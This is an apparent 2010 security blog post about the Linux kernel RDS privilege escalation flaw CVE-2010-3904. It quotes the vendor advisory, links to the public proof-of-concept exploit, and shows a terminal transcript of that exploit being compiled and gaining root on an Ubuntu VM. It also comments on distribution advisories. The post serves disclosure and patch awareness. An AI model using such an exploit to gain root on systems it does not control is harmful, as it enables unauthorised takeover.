---
layout: post
title: Privilege escalation in the Linux kernel
date: '2010-10-21T10:29:00.002+02:00'
author: Xavier Garcia
tags:
- escalation
- Linux
- rds
modified_time: '2010-10-22T16:02:09.837+02:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-6674559362205839867
blogger_orig_url: http://www.shellguardians.com/2010/10/privilege-escalation-in-linux-kernel.html
---
[H security](http://www.h-online.com/security/news/item/Hole-in-Linux-kernel-provides-root-rights-1122180.html) has informed about the second privilege escalation in Linux this week (the first is an error in the ld linker) with [CVE-2010-3904](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3904) .  
  
They point to the [advisory](http://www.vsecurity.com/resources/advisory/20101019-1/) as well as the [PoC](http://www.vsecurity.com/download/tools/linux-rds-exploit.c).  
  

> On October 13th, VSR identified a vulnerability in the RDS protocol, as implemented in the Linux kernel. Because kernel functions responsible for copying data between kernel and user space failed to verify that a user-provided address actually resided in the user segment, a local attacker could issue specially crafted socket function calls to write arbitrary values into kernel memory. By leveraging this capability, it is possible for unprivileged users to escalate privileges to root. 

  
  
I have tested it in an old Ubuntu 10.10 RC vmware image and it worked.  
Ubuntu's [advisory](https://lists.ubuntu.com/archives/ubuntu-security-announce/2010-October/001181.html) published on October 19th.  
  
``` 
msk@ubuntu:~$ gcc -o test linux-rds-exploit.c  
msk@ubuntu:~$ ./test  
[*] Linux kernel >= 2.6.30 RDS socket exploit  
[*] by Dan Rosenberg  
[*] Resolving kernel addresses...  
 [+] Resolved rds_proto_ops to 0xe09d6a40  
 [+] Resolved rds_ioctl to 0xe09d0000  
 [+] Resolved commit_creds to 0xc016c340  
 [+] Resolved prepare_kernel_cred to 0xc016c790  
[*] Overwriting function pointer...  
[*] Triggering payload...  
[*] Restoring function pointer...  
[*] Got root!  
# id  
uid=0(root) gid=0(root) groups=0(root)  
``` 
  
I have checked the [advisory](https://www.redhat.com/security/data/cve/CVE-2010-3904.html) published by RedHat and seems that RHEL  is not affected, ( RHEL 3 and 4 for sure) or I did not manage to make it work.  
  
Debian seems to have a vulnerable kernel only in unstable (squeeze) and sid. The [advisory](http://security-tracker.debian.org/tracker/CVE-2010-3904) marks all the versions as vulnerable but it should be false because stable and backports does not support RDS.
